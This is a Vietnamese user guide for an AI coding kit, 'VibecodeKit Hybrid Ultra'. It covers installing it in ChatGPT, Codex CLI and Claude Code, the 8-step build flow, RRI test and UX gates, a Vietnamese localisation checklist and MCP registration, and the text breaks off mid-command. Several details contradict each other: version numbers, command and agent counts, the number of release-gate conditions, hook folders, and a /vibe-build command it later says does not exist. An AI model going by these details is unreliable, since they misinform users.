# VibecodeKit Hybrid Ultra — Hướng dẫn sử dụng chi tiết (v0.16.1)

Bộ kit đầy đủ để build dự án theo phương pháp **VIBECODE-MASTER** với **Full
Agentic OS** runtime (87 internal conformance probes at v0.16.1 — self-test, not external benchmark; see `BENCHMARKS-METHODOLOGY.md`; all
actionable tests pass từ repo root; bundled `tests/` trong skill zip chứa
một subset đại diện để user smoke-test sau khi extract — xem §15.10).
Bản này ứng với **v0.16.1** — doc-coherence + recheck cleanup release
(closing 5 P3 findings từ v0.16.0 auto-recheck).  Lịch sử các bản trước:

- **v0.16.1** — doc coherence + recheck cleanup (PR #16, this release)
- **v0.16.0** — final cleanup of v0.15.4 audit P3 findings (PR #15)
- **v0.16.0a0** — α: wire `auto_commit_hook` + multi-token routers (PR #14)
- **v0.15.5** — green hotfix: stale runtime version constants (PR #13)
- **v0.15.4** — doc-sync hotfix
- **v0.11.4.1** — original full big-update với 6 taw-kit feature
  (F1 scaffold engine, F2 deploy orchestrator, F3 auto-commit guard,
  F4 single-prompt `/vibe` router, F5 VN error translator + faker,
  F6 CLAUDE.md auto-maintain — xem §16).

Tài liệu hướng dẫn cách sử dụng kit trong **ChatGPT**, **OpenAI Codex CLI**, và
**Claude Code / Claw Code CLI** để build project end-to-end.

> ⏱ **Chỉ có 5 phút?**  Đọc [`QUICKSTART.md`](QUICKSTART.md) trước — 5 phút đủ
> để unzip, chạy lệnh đầu tiên và xem decision tree "bạn là ai → đi con đường
> nào".  Quay lại file này khi cần tham khảo sâu từng phần.

> 📦 **Cần tham khảo nhanh inventory đầy đủ?**  Nhảy thẳng tới
> [§19 CLI reference (31 subcommand)](#19-cli-reference--31-subcommand),
> [§20 Slash command reference (42 lệnh)](#20-slash-command-reference--42-lệnh),
> [§21 Sub-agent reference (7 vai)](#21-sub-agent-reference--7-vai),
> [§22 Hook event reference (33 event + 4 script)](#22-hook-event-reference--33-event--4-script),
> hoặc [§23 Conformance probe catalog (87 probe)](#23-conformance-probe-catalog--87-probe).

---

## Mục lục

### Phần I — Hướng dẫn dùng (use-case driven)

1. [Triết lý: 3 vai × 8 bước](#1-triết-lý-3-vai--8-bước)
2. [Cài đặt](#2-cài-đặt)
3. [Dùng trong ChatGPT (web + desktop)](#3-dùng-trong-chatgpt)
4. [Dùng trong OpenAI Codex CLI](#4-dùng-trong-openai-codex-cli)
5. [Dùng trong Claude Code / Claw Code CLI](#5-dùng-trong-claude-code--claw-code-cli)
6. [End-to-end: 8 bước build một dự án](#6-end-to-end-8-bước-build-một-dự-án)
7. [RRI — Reverse Requirements Interview](#7-rri--reverse-requirements-interview)
8. [RRI-T — Testing (5 personas × 7 dims × 8 axes)](#8-rri-t--testing)
9. [RRI-UX — UX Critique (Flow Physics)](#9-rri-ux--ux-critique)
10. [RRI-UI — pipeline 4-phase](#10-rri-ui--design-pipeline)
11. [Vietnamese 12-point checklist](#11-vietnamese-12-point-checklist)
12. [MCP server registration](#12-mcp-server-registration)
13. [Memory hierarchy 3-tier](#13-memory-hierarchy-3-tier)
14. [CLI cheatsheet (quick)](#14-cli-cheatsheet)
15. [Troubleshooting](#15-troubleshooting)

### Phần II — Reference catalog (lookup driven)

19. [CLI reference — 31 subcommand](#19-cli-reference--31-subcommand)
20. [Slash command reference — 42 lệnh](#20-slash-command-reference--42-lệnh)
21. [Sub-agent reference — 7 vai](#21-sub-agent-reference--7-vai)
22. [Hook event reference — 33 event + 4 script](#22-hook-event-reference--33-event--4-script)
23. [Conformance probe catalog — 87 probe](#23-conformance-probe-catalog--87-probe)
24. [Permission engine — 6 layer](#24-permission-engine--6-layer)
25. [Release-gate strategy](#25-release-gate-strategy)

### Phần III — Lịch sử & phụ lục

16. [v0.11.x → v0.16.x release history](#16-release-history)
    1. [`/vibe` — single-prompt router (F4)](#161-vibe--single-prompt-router-f4)
    2. [`/vibe-scaffold` — 10 preset × 3 stacks (F1)](#162-vibe-scaffold--scaffold-engine-f1)
    3. [`/vibe-ship` — 7 deploy target (F2)](#163-vibe-ship--deploy-orchestrator-f2)
    4. [CLAUDE.md auto-maintain (F6)](#164-claudemd-auto-maintain-f6)
    5. [Auto-commit hook + sensitive-file guard (F3)](#165-auto-commit-hook--sensitive-file-guard-f3)
    6. [VN error translator + VN faker (F5)](#166-vn-error-translator--vn-faker-f5)

---

## 1. Triết lý: 3 vai × 8 bước

VIBECODE-MASTER dựng một nhà bằng hình ảnh **3 vai** quen thuộc với người
dùng Việt, áp dụng cho hợp tác người–AI:

| Vai | Tiếng Anh | Trách nhiệm |
|-----|-----------|-------------|
| **Con người** | Homeowner | Đưa yêu cầu thật, ký duyệt, chịu hậu quả kinh doanh. |
| **Chủ thầu** | Contractor | LLM "lead" — phiên dịch ý định thành blueprint + task graph, phân công, kiểm tra chất lượng. |
| **Thợ** | Builder | LLM "worker" — viết code, chạy test, trả báo cáo. Phải tuân thủ TIP (Task Instruction Pack). |

Ba vai này **không bao giờ bị phá vỡ** trong một session: Con người không code,
Chủ thầu không viết file trực tiếp, Thợ không tự ý đổi phạm vi.

Dự án đi qua **8 bước tuần tự** — hình vẽ chi tiết (hiển thị tốt trên GitHub,
VS Code Markdown preview, Typora, Obsidian, và các viewer hỗ trợ Mermaid):

```mermaid
flowchart LR
    subgraph Homeowner [👤 Homeowner]
        H1[Yêu cầu + ký duyệt]
    end
    subgraph Contractor [🏗️ Contractor]
        C1[Phiên dịch<br/>blueprint + task graph]
        C2[Phân công<br/>+ kiểm tra chất lượng]
    end
    subgraph Builder [🔨 Builder]
        B1[Viết code<br/>+ test + report]
    end

    S1[1. SCAN<br/>repo introspect]
    S2[2. RRI<br/>5 persona interview]
    S3[3. VISION<br/>One-pager]
    S4[4. BLUEPRINT<br/>ADR + contracts]
    S5[5. TASK GRAPH<br/>DAG + TIP]
    S6[6. BUILD<br/>subagent exec]
    S7[7. VERIFY<br/>RRI-T + RRI-UX + VN-check]
    S8[8. REFINE<br/>ledger + retro]

    H1 --> S1
    S1 --> S2 --> S3 --> S4 --> S5
    S5 --> S6
    S6 --> S7
    S7 -->|PASS| S8
    S7 -.->|FAIL| S6
    S8 -->|new scope| H1

    C1 -.- S3
    C1 -.- S4
    C2 -.- S5
    C2 -.- S7
    B1 -.- S6
```

Dạng ASCII đơn giản nếu viewer không hỗ trợ Mermaid:

```
SCAN ──▶ RRI ──▶ VISION ──▶ BLUEPRINT ──▶ TASK GRAPH ──▶ BUILD ──▶ VERIFY ──▶ REFINE
                                                           ▲          │
                                                           └──FAIL────┘
```

Mỗi bước có một slash-command tương ứng (`/vibe-scan`, `/vibe-vision`, ...) và
một template output (trong `assets/templates/`). Kit **ép khuôn** bằng cách:

- Không cho phép BUILD nếu chưa có BLUEPRINT đã ký duyệt.
- Không cho phép SHIP nếu RRI-T và RRI-UX chưa qua release gate.
- Không cho phép VERIFY nếu Vietnamese 12-point checklist (khi scope là VN)
  chưa PASS.

---

## 2. Cài đặt

Bộ kit có **hai bundle** — cài một cái, cả hai, hoặc không cài gì tùy môi
trường. Cả hai đều ZIP không cần internet.

### 2.1 Skill bundle — `vibecodekit-hybrid-ultra-v0.10.3-skill.zip`

Là cái "thư viện kiến thức" + Python runtime:

```
vibecodekit-hybrid-ultra/
├── SKILL.md                  # Activation contract (frontmatter)
├── references/               # 33 tài liệu chuyên sâu (Vietnamese + English)
├── assets/
│   ├── templates/            # TIP, vision, completion-report, rri-matrix, ...
│   └── plugin-manifest.json
└── scripts/vibecodekit/      # CLI runtime (permission engine, MCP client,
                              #  methodology evaluators, v.v.)
```

Dùng cho: ChatGPT (upload nguyên zip), bất kỳ LLM nào hỗ trợ skill-style
attachments, hoặc làm thư viện Python (`PYTHONPATH=.../scripts`).

### 2.2 Update-package — `vibecodekit-hybrid-ultra-v0.10.3-update-package.zip`

Là "overlay" cho các CLI dùng `.claude/` hoặc `.claw/` convention:

```
.claude/
├── commands/       # 42 slash commands (25 `/vibe-*` + 1 master `/vibe` + 16 `/vck-*`)
├── agents/         # 7 agent cards (coordinator, scout, builder, qa, security, reviewer, qa-lead)
├── hooks/          # 4 hook lifecycle scripts
└── ...
.claw.json          # runtime config
CLAUDE.md           # activation reminder
ai-rules/           # embedded rules
```

Dùng cho: **Claude Code CLI**, **Claw Code CLI**, Cursor (qua `.cursorrules`).

### 2.3 Lựa chọn nhanh

| Môi trường | Cần gì |
|------------|--------|
| ChatGPT (web/desktop) | chỉ cần `skill.zip` — upload file hoặc paste SKILL.md |
| Codex CLI | `skill.zip` (làm reference) + `update-package` (`.claude/commands/`) |
| Claude Code CLI | `update-package` (copy vào repo) + có thể cài thêm `skill.zip` |
| Claw Code CLI | `update-package` (copy vào repo) — chuẩn convention |
| Cursor | `update-package` + chuyển `.claude/commands/*.md` thành `.cursor/rules/` |
| Dùng như thư viện Python | `skill.zip` → `PYTHONPATH=…/scripts python -m vibecodekit.cli …` |

---

## 3. Dùng trong ChatGPT

### 3.1 Upload skill zip (khuyến nghị)

1. Mở một conversation mới trong ChatGPT (model GPT-4/4o/5, hỗ trợ file upload).
2. Kéo–thả `vibecodekit-hybrid-ultra-v0.10.3-skill.zip` vào khung chat.
3. Gửi prompt khởi đầu (template bên dưới).

Prompt khởi đầu chuẩn:

```
Bạn là "Chủ thầu" (contractor) trong hệ VIBECODE-MASTER. Tôi đính kèm skill
bundle vibecodekit-hybrid-ultra v0.10.3. Hãy:

1. Giải nén và đọc SKILL.md.
2. Đọc reference 29 (RRI), 30 (VIBECODE-MASTER), 31 (RRI-T), 32 (RRI-UX),
   33 (RRI-UI).
3. Trả lời bằng đúng format "Contractor ready" + liệt kê 8 bước flow.

Dự án của tôi: <mô tả 1-2 câu>. Bắt đầu từ bước SCAN.
```

Sau khi model xác nhận, bạn gõ `/vibe-scan` (hoặc nói "chạy SCAN cho project").
Model sẽ dùng template trong `assets/templates/` để xuất output đúng format.

### 3.2 Dán SKILL.md trực tiếp (khi không có file upload)

Nếu dùng API hoặc ChatGPT không cho upload zip (ví dụ mobile):

1. Mở `skill/vibecodekit-hybrid-ultra/SKILL.md`.
2. Dán nội dung `SKILL.md` vào prompt system (hoặc user message đầu tiên).
3. Kèm theo 1–2 reference quan trọng nhất (thường là `29-rri-reverse-interview.md`
   + `30-vibecode-master.md`).
4. Prompt khởi đầu như trên.

Mẹo: giữ prompt system <8 KB; nếu vượt, chỉ dán SKILL.md + tóm tắt 3 dòng
của mỗi reference.

### 3.3 Kiểm chứng

Hỏi model: "Liệt kê 5 RRI personas và 7 RRI-T dimensions". Nếu trả đúng
(Architect/Lead/QA/Security/Compliance + D1 UI/UX · D2 API · D3 Performance ·
D4 Security · D5 Data Integrity · D6 Infrastructure · D7 Edge & Error
Recovery), skill đã được kích hoạt thành công.

### 3.4 Lưu ý giới hạn

- ChatGPT không có shell để chạy Python runtime; các lệnh `vibe rri-t <path>`
  phải được bạn chạy cục bộ và paste kết quả vào chat.
- Permission engine, hook interceptor, MCP client không thể hoạt động trong
  ChatGPT sandbox. Chúng chỉ có giá trị khi dùng song song với Claude Code
  CLI / Claw Code / Devin có filesystem thật.
- Dùng ChatGPT **chỉ** để: (a) làm Chủ thầu (blueprint, review, RRI), (b) làm
  Thợ cho chunks nhỏ trả lời ra prompt cuối.

---

## 4. Dùng trong OpenAI Codex CLI

OpenAI Codex CLI (`codex`) đi kèm model `code-*` và hỗ trợ agent mode với
command-execution. Bộ kit gài vào theo 2 tầng:

### 4.1 Tầng 1 — dùng skill bundle làm context

```bash
# Giải nén skill vào working directory
unzip vibecodekit-hybrid-ultra-v0.10.3-skill.zip -d ~/.vibecode/

# Xuất PYTHONPATH để CLI runtime chạy
export PYTHONPATH=~/.vibecode/vibecodekit-hybrid-ultra/scripts
export VIBECODE_ROOT=~/.vibecode/vibecodekit-hybrid-ultra

# Cho Codex biết đường dẫn skill
codex --system-file ~/.vibecode/vibecodekit-hybrid-ultra/SKILL.md \
      --reference-dir ~/.vibecode/vibecodekit-hybrid-ultra/references \
      "Bắt đầu dự án <tên>; thực hiện /vibe-scan rồi /vibe-rri."
```

### 4.2 Tầng 2 — dùng update-package làm slash-command provider

Copy `.claude/commands/` từ update-package vào repo (Codex CLI nhận slash
commands từ `.claude/commands/` nếu có):

```bash
unzip vibecodekit-hybrid-ultra-v0.10.3-update-package.zip -d <repo>/
cd <repo>
codex chat
> /vibe-scan
> /vibe-vision
> /vibe-blueprint
> /vibe-task graph
> /vibe-build
> /vibe-verify
```

### 4.3 Chạy methodology CLI song song

Trong terminal khác (hoặc sau khi model sinh log), chạy:

```bash
# RRI-T release gate
python -m vibecodekit.cli rri-t reports/rri-t-sprint7.jsonl
# → in JSON scorecard; exit 0 nếu PASS, 1 nếu FAIL

# RRI-UX gate
python -m vibecodekit.cli rri-ux reports/rri-ux-sprint7.jsonl

# Vietnamese 12-point
python -m vibecodekit.cli vn-check --file reports/vn-flags.json
```

### 4.4 Hook vào Codex execution

Update-package bao gồm `.claude/hooks/pre_tool_use.py`. Codex CLI có thể
được cấu hình để chạy hook này trước mỗi tool call:

```bash
export CODEX_PRE_TOOL_HOOK=$PWD/.claude/hooks/pre_tool_use.py
```

Hook trả về JSON `{"decision":"allow"|"deny", "reason": "..."}` — Codex
phải tôn trọng decision này trước khi thực thi lệnh shell.

---

## 5. Dùng trong Claude Code / Claw Code CLI

Đây là môi trường chuẩn của bộ kit. Việc tích hợp chỉ là **giải nén update-package
vào repo**.

### 5.1 Cài đặt

```bash
cd <your-project>
unzip /path/to/vibecodekit-hybrid-ultra-v0.10.3-update-package.zip

# Xem các slash command khả dụng
ls .claude/commands/
# vibe-scan.md  vibe-vision.md  vibe-blueprint.md  vibe-task.md  ...
```

Khởi động Claude Code / Claw Code:

```bash
claude-code      # hoặc: claw chat
```

Lúc đó model sẽ đọc `CLAUDE.md` → hiểu bộ kit đang active → tất cả
slash command trong `.claude/commands/` sẵn sàng.

### 5.2 Các slash command quan trọng (21 tổng — khớp `assets/plugin-manifest.json`)

| Command | Công dụng |
|---------|-----------|
| `/vibe-scan` | Bước 1 — quét repo + tài liệu, lập đồ bản hiện trạng. |
| `/vibe-rri` | Bước 2 — Reverse Requirements Interview, 5 personas. |
| `/vibe-vision` | Bước 3 — đóng định hướng, deliverable, constraint. |
| `/vibe-blueprint` | Bước 4 — kiến trúc, interface, data model. |
| `/vibe-tip` | Task Instruction Pack cho mỗi builder chunk. |
| `/vibe-task graph` | Bước 5 — DAG các task. |
| `/vibe-task agent …` | Spawn agent task. |
| `/vibe-task workflow …` | Spawn workflow task từ JSON steps. |
| `/vibe-task dream` | 4-phase DreamTask (orient → gather → consolidate → prune). |
| `/vibe-rri-t <path>` | Bước 7 — release gate testing. |
| `/vibe-rri-ux <path>` | Bước 7 — release gate UX. |
| `/vibe-rri-ui` | Bước 7 — pipeline 4-phase cho UI. |
| `/vibe-verify` | Đóng báo cáo verify. |
| `/vibe-complete` | Completion Report. |
| `/vibe-audit` | Chạy 87 conformance probes (at v0.16.1). |
| `/vibe-doctor` | Chẩn đoán sức khỏe cài đặt. |
| `/vibe-dashboard` | Dashboard runtime. |
| `/vibe-permission <cmd>` | Hỏi permission engine có allow lệnh không. |
| `/vibe-compact [--reactive]` | Layer 4/5 compaction. |
| `/vibe-memory` | Memory hierarchy (user/project/team). |
| `/vibe-approval` | Approval JSON contract. |
| `/vibe-subagent <role> <obj>` | Spawn agent role (builder/qa/...). |
| `/vibe-run <plan>` | Query-loop engine (agent/tool/compact). |
| `/vibe-install <dest>` | Cài overlay vào project mới. |

Các lệnh runtime **không** có slash-command (chỉ qua CLI shell):
`vibe ledger`, `vibe mcp`, `vibe discover`, `vibe doctor --installed-only`
— xem §14 CLI cheatsheet.

### 5.3 Agent cards

5 vai trò subagent (trong `.claude/agents/`):

- **coordinator** — đọc/search; **không** mutate files.
- **scout** — grep, read, glob; không write.
- **builder** — full read + write + test; không push.
- **qa** — read + run tests; không write code.
- **security** — read + redact logs; không run shell.

Spawn qua:

```bash
python -m vibecodekit.cli subagent spawn builder "Implement /api/users endpoint per TIP T-007"
```

### 5.4 Hook lifecycle

Update-package ship 4 hook script trong `.claw/hooks/` (lưu ý: thư mục là
`.claw` không phải `.claude`):

- `pre_tool_use.py` — chặn lệnh nguy hiểm trước khi chạy (40+ pattern).
- `post_tool_use.py` — log + redact secrets khỏi payload.
- `pre_compact.py` — chạy trước layer-4/5 compaction.
- `session_start.py` — init runtime khi session bắt đầu.

Hook nhận argv + env (`$VIBECODE_HOOK_EVENT`, `$VIBECODE_HOOK_COMMAND`,
`$VIBECODE_HOOK_PAYLOAD`) + JSON payload qua stdin, trả JSON decision qua
stdout. Runtime khai báo 12 event names: `pre_query`, `post_query`,
`pre_tool_use`, `post_tool_use`, `pre_tip`, `post_completion`, `pre_release`,
`pre_release_gate`, `pre_compact`, `post_compact`, `session_start`,
`session_end` (xem `references/14-plugin-extension.md`). Runtime mở rộng
qua `SUPPORTED_EVENTS` trong `scripts/vibecodekit/hook_interceptor.py` —
**33 event points tổng cộng** phân bổ 9 nhóm: Tool (3) · Permission (2) ·
Session (3) · Agent (3) · Task (4) · Context (3) · Filesystem (4) ·
UI/Config (5) · Query legacy (6). Xem file nguồn cho danh sách chính xác.

---

## 6. End-to-end: 8 bước build một dự án

Ví dụ: build module quản lý đơn hàng cho app Shopee-clone Việt Nam.

### Bước 1 — SCAN

```bash
claude-code
> /vibe-scan
```

Model xuất template `assets/templates/scan-report.md` với:
- Repo structure
- Tech stack detected
- Existing patterns
- Known debt / risks

### Bước 2 — RRI (Reverse Requirements Interview)

```
> /vibe-rri CHALLENGE
```

Mode `CHALLENGE`: 5 personas đặt câu hỏi nghịch đảo (what could break?).
Trả về `assets/templates/rri-matrix.md` đã điền.

Ba mode:
- `CHALLENGE` — phản biện mạnh, cố tìm lỗ hổng.
- `GUIDED` — hỏi dẫn dắt từng bước.
- `EXPLORE` — mở rộng scope, brainstorm options.

### Bước 3 — VISION

```
> /vibe-vision
```

Xuất `vision.md`:
- Mục tiêu 1 câu
- Thành công trông ra sao (3 KPI đo được)
- Non-goals
- Ràng buộc

### Bước 4 — BLUEPRINT

```
> /vibe-blueprint
```

Xuất `blueprint.md`:
- Kiến trúc (mermaid diagram)
- Data model (SQL/Prisma/Pydantic)
- Public interface (OpenAPI/TS types)
- Dependency map
- Non-function: latency, cost, VND format, CCCD validation

### Bước 5 — TASK GRAPH

```
> /vibe-task graph
```

Sinh DAG các TIP (Task Instruction Pack), mỗi node có:
- `id`, `title`
- `owner` (coordinator/builder/qa)
- `deps`
- `acceptance` — tiêu chí đóng
- `artifacts` — file sẽ được tạo/sửa

### Bước 6 — BUILD

Mỗi TIP tương ứng một lệnh subagent spawn. Không có slash-command `/vibe-build`
— dùng `/vibe-subagent` trong Claude Code / Claw Code, hoặc CLI:

```bash
# Từ slash-command
/vibe-subagent builder "Implement TIP T-042"

# Hoặc CLI tương đương
python -m vibecodekit.cli subagent spawn builder "Implement TIP T-042"

# Hoặc đăng ký task kind long-running
python -m vibecodekit.cli task agent --role builder \
    --objective "Implement TIP T-042" \
    --description "Order-module sprint 7"
```

Builder nhận TIP, implement, chạy tests tự sinh, trả artifact + test report.
ACL sẽ **chặn** builder chạy `git push` hoặc sửa file ngoài scope TIP.

### Bước 7 — VERIFY

Ba lớp gate:

```bash
# 7a — RRI-T test log
python -m vibecodekit.cli rri-t reports/rri-t.jsonl
# exit 0 ⇔ gate PASS

# 7b — RRI-UX critique log
python -m vibecodekit.cli rri-ux reports/rri-ux.jsonl

# 7c — Vietnamese 12-point (nếu scope VN)
python -m vibecodekit.cli vn-check --file reports/vn-flags.json

# 7d — runtime audit
python -m vibecodekit.cli audit --threshold 0.85
```

**Không ship** nếu bất kỳ gate nào FAIL.

### Bước 8 — REFINE

```
> /vibe-complete
```

Xuất Completion Report gồm:
- Deliverables (PR link, artifact paths)
- Test summary
- Scorecard 4 gate
- Known follow-ups
- Reviewer notes

---

## 7. RRI — Reverse Requirements Interview

Canonical meaning (v0.10+): **Reverse Requirements Interview** — phỏng vấn
nghịch đảo yêu cầu, 5 personas × 3 modes.

### 5 personas

| # | Persona | Mối quan tâm |
|---|---------|---------------|
| 1 | Architect | Kiến trúc, data flow, dependency |
| 2 | Lead | Timeline, cost, team capacity |
| 3 | QA | Edge cases, failure modes, coverage |
| 4 | Security | Threat model, auth, data leak |
| 5 | Compliance | GDPR, VN Nghị định 13, retention |

### 3 modes

| Mode | Khi nào dùng |
|------|--------------|
| CHALLENGE | Sprint planning, early-stage design review |
| GUIDED | Khi user chưa quen format — dẫn dắt từng câu |
| EXPLORE | Khi scope còn mờ — brainstorm personas song song |

Output: `assets/templates/rri-matrix.md` điền đủ 15 ô (5 × 3).

> Ghi chú: v0.7 cũng dùng từ "RRI" cho **Role-Responsibility-Interface**
> (runtime governance). Kể từ v0.10, "RRI" canonical là **Reverse Requirements
> Interview**. Role-Responsibility-Interface được đổi tên thành "Runtime
> Permissions Matrix" trong reference 10.

---

## 8. RRI-T — Testing

Testing methodology chuyên sâu: 5 testing personas × 7 dimensions × 8 stress
axes. Reference đầy đủ ở `references/31-rri-t-testing.md`.

### 7 dimensions

(Nguồn chuẩn: `references/31-rri-t-testing.md §2`.)

| Code | Dimension | Kiểm chứng điều gì |
|------|-----------|-------------------|
| D1 | UI / UX Testing | Look & feel, accessibility, responsiveness |
| D2 | API Testing | Contract, status codes, payload shape, idempotency |
| D3 | Performance Testing | Budgets + load scenarios + profiler evidence |
| D4 | Security Testing | OWASP top-10, authn/authz, data exposure, rate-limit |
| D5 | Data Integrity Testing | Business rules, referential integrity, ledger balances |
| D6 | Infrastructure Testing | Deploy, rollback, backup, migration, scaling |
| D7 | Edge Case & Error Recovery | Boundaries, empty, overflow, concurrency, graceful fail |

### 8 stress axes

TIME, DATA, ERROR, COLLAB, EMERGENCY, SECURITY, INFRASTRUCTURE, LOCALIZATION

### Release gate (3 conditions, phải thoả đủ)

1. **Every** dimension có ít nhất 1 test entry.
2. **Every** dimension ≥ 70 % PASS rate.
3. ≥ **5/7** dimensions ≥ 85 % PASS rate.
4. **0** P0 FAIL items.

### Dùng template QARPT

`assets/templates/rri-t-test-case.md` (format chuẩn theo reference 31 §5):

```
ID: [MODULE]-[DIMENSION]-[NUMBER]    # ví dụ: ORD-D4-012
Persona: [👤|📋|🔍|🛠️|🔒]             # 1 trong 5 RRI personas
Q: Câu hỏi từ góc nhìn persona
A: Expected behaviour (answer — cái đáng xảy ra)
R: Requirement rút ra (maps back to REQ-*)
P: P0 | P1 | P2 | P3
T: TEST CASE
   Precondition: <setup>
   Steps:        1. ... 2. ... 3. ...
   Expected:     <observable outcome>
Result: ✅ PASS | ❌ FAIL | ⚠️ PAINFUL | 🔲 MISSING
```

### 4 result levels

| Marker | Result  | Ý nghĩa |
|:------:|---------|---------|
| ✅     | `PASS`   | Behaviour khớp spec — **được tính** vào good-count |
| ❌     | `FAIL`   | Behaviour vi phạm spec |
| ⚠️     | `PAINFUL`| Pass về spec nhưng đau cho user (UX/ops friction) |
| 🔲     | `MISSING`| Spec không bao phủ — feed ngược về RRI |

Ghi chú: `evaluate_rri_t` chỉ đếm `PASS` là good; `PAINFUL` và `MISSING` vẫn
tính vào `total` nhưng không vào `good`, do đó kéo phần trăm dim xuống.

### Log format (JSONL)

Mỗi test case một dòng:

```json
{"id":"AUTH-D4-001","dimension":"D4","result":"PASS","priority":"P1","notes":"SQL injection blocked at query layer"}
{"id":"ORD-D5-003","dimension":"D5","result":"FAIL","priority":"P0","notes":"Order total drift under concurrency"}
{"id":"UI-D1-007","dimension":"D1","result":"PAINFUL","priority":"P2","notes":"Form scrolls off-screen on 13-inch"}
```

### Chạy gate

```bash
python -m vibecodekit.cli rri-t reports/rri-t-sprint7.jsonl
```

Output JSON:

```json
{
  "summary": {"total": 87, "pass": 83, "overall_percent": 95.4, "dimensions_evaluated": 7},
  "per_dimension": {
    "D1": {"good": 20, "total": 20, "percent": 100.0},
    ...
  },
  "missing_dimensions": [],
  "p0_fails": [],
  "gate": "PASS",
  "reasons": []
}
```

Exit code: `0` nếu gate PASS, `1` nếu FAIL.

---

## 9. RRI-UX — UX Critique

UX critique theo **Flow Physics** — UX phải "chảy" như nước. 5 UX personas
× 7 dimensions × 8 Flow Physics axes. Ref `references/32-rri-ux-critique.md`.

### 7 dimensions

(Nguồn chuẩn: `references/32-rri-ux-critique.md §3`.)

| Code | Dimension | Asserts |
|------|-----------|---------|
| U1 | Flow Direction | Next step nằm đúng nơi mắt + tay đang hướng về |
| U2 | Information Hierarchy | Primary > secondary > tertiary rõ ràng bằng mắt |
| U3 | Cognitive Load | ≤ 7 ± 2 lựa chọn / chunk / progressive disclosure |
| U4 | Feedback & State | Mỗi action → feedback nhìn thấy được < 100 ms |
| U5 | Error Recovery | Lỗi nói WHAT is wrong + WHAT to do to fix it |
| U6 | Accessibility & Readability | Contrast ≥ 4.5, keyboard reachable, screen-reader OK |
| U7 | Context Preservation | Tabs, filter, scroll position, draft sống sót khi blur |

### 8 Flow Physics axes

SCROLL · CLICK DEPTH · EYE TRAVEL · DECISION LOAD · RETURN PATH · VIEWPORT
· VN TEXT · FEEDBACK

### Template SVPFI

`assets/templates/rri-ux-critique.md` (format chuẩn theo reference 32 §6):

```
ID: [MODULE]-[DIMENSION]-[NUMBER]    # ví dụ: CART-U1-003
Persona: [🏃|👁️|📊|🔄|📱]             # 1 trong 5 UX personas
S: Scenario từ góc nhìn persona
V: Vi phạm cụ thể (hoặc "None — đã FLOW")
P: Trục vi phạm (SCROLL/CLICK/EYE/...) + Dimension vi phạm (U1..U7)
F: Giải pháp — đến tận component / CSS nếu có thể
I: [P0|P1|P2|P3] — [FLOW|FRICTION|BROKEN|MISSING]
```

### 4 result levels

| Marker | Result     | Ý nghĩa |
|:------:|------------|---------|
| 🌊     | `FLOW`     | Natural, không có friction — **được tính** vào good-count |
| ⚠️     | `FRICTION` | Hoạt động được nhưng làm user chậm lại |
| ⛔     | `BROKEN`   | User không hoàn thành task nếu không có heroic effort |
| 🔲     | `MISSING`  | Design không xét scenario này — feed ngược về RRI |

Ghi chú: `evaluate_rri_ux` chỉ đếm `FLOW` là good.

### Log format (JSONL)

```json
{"id":"CART-U1-001","dimension":"U1","result":"FLOW","priority":"P1"}
{"id":"CHK-U6-005","dimension":"U6","result":"BROKEN","priority":"P0","notes":"Dấu tiếng Việt hiển thị ??? trên mobile"}
{"id":"NAV-U7-002","dimension":"U7","result":"FRICTION","priority":"P2","notes":"Filter mất sau khi back navigation"}
```

### Release gate

1. Every dim covered.
2. Every dim ≥ 70 % FLOW.
3. ≥ 5/7 dims ≥ 85 % FLOW.
4. 0 P0 BROKEN items.

### Chạy

```bash
python -m vibecodekit.cli rri-ux reports/rri-ux-sprint7.jsonl
```

---

## 10. RRI-UI — Design Pipeline

Kết hợp RRI-UX + RRI-T thành **4-phase pipeline**. Ref
`references/33-rri-ui-design.md`.

```
Phase 1: DISCOVER    →  chạy RRI-UX trên prototype/mock
Phase 2: CRITIQUE    →  5 UX personas đánh giá, log FLOW/FRICTION/BROKEN
Phase 3: ITERATE     →  fix, re-critique cho đến khi gate PASS
Phase 4: HARDEN      →  chạy RRI-T trên implementation, gate PASS trước ship
```

Không có CLI runner riêng — dùng tuần tự `rri-ux` rồi `rri-t` theo phase.

---

## 11. Vietnamese 12-point checklist

Mandatory khi scope chạm tới người dùng Việt. Ref `references/32-rri-ux-critique.md §9`.

(Tên key phải khớp chính xác `methodology.VN_CHECKLIST_ITEMS`; key lạ bị bỏ
qua, key thiếu = `False` → FAIL.)

| Key (canonical) | Mô tả |
|-----------------|-------|
| `nfkd_diacritics` | Diacritic-insensitive search (NFKD normalisation) |
| `address_cascade` | Address fields cascade: Tỉnh → Huyện → Xã |
| `vnd_formatting` | VND render dấu chấm ngăn cách + suffix ` ₫` |
| `cccd_12_digits` | CCCD / CMND validator enforce 12 / 9 chữ số |
| `date_dd_mm_yyyy` | Dates hiển thị DD/MM/YYYY (không MM/DD/YYYY) |
| `phone_10_digits` | Phone validator accept `+84` và local 10-digit |
| `longest_string_layout` | Layout tested với longest Vietnamese label |
| `diacritic_sort` | Sorting theo bảng chữ cái tiếng Việt (a < ă < â < b…) |
| `vn_money_spellout` | Optional VND spell-out khớp TCVN / định dạng ngân hàng |
| `holidays_lunar` | Lunar holidays support trong date picker (Tết, Giỗ Tổ, ...) |
| `encoding_utf8` | Mọi response emit UTF-8, no BOM |
| `rtl_awareness` | RTL awareness được khai báo explicit (VN là LTR) |

### Chạy

Tạo file flags JSON:

```json
{
  "nfkd_diacritics": true,
  "address_cascade": true,
  "vnd_formatting": true,
  "cccd_12_digits": true,
  "date_dd_mm_yyyy": true,
  "phone_10_digits": true,
  "longest_string_layout": true,
  "diacritic_sort": true,
  "vn_money_spellout": false,
  "holidays_lunar": false,
  "encoding_utf8": true,
  "rtl_awareness": true
}
```

```bash
python -m vibecodekit.cli vn-check --file reports/vn-flags.json
```

Hoặc inline:

```bash
python -m vibecodekit.cli vn-check \
  --flags-json '{"nfkd_diacritics":true, "vnd_formatting":true, ...}'
```

Gate: PASS ⇔ tất cả 12 key = true.

---

## 12. MCP server registration

Kit có full MCP client (JSON-RPC over stdio hoặc in-process Python).

### 12.1 In-process (nhanh, test)

```bash
# Register bundled selfcheck server (ping/echo/now)
python -m vibecodekit.cli mcp register selfcheck \
    --transport inproc \
    --module vibecodekit.mcp_servers.selfcheck \
    --description "Bundled self-check"

python -m vibecodekit.cli mcp list
python -m vibecodekit.cli mcp call selfcheck ping
python -m vibecodekit.cli mcp call selfcheck echo --args-json '{"text":"hi"}'
```

### 12.2 Stdio (production, full handshake)

```bash
python -m vibecodekit.cli mcp register filesystem \
    --transport stdio \
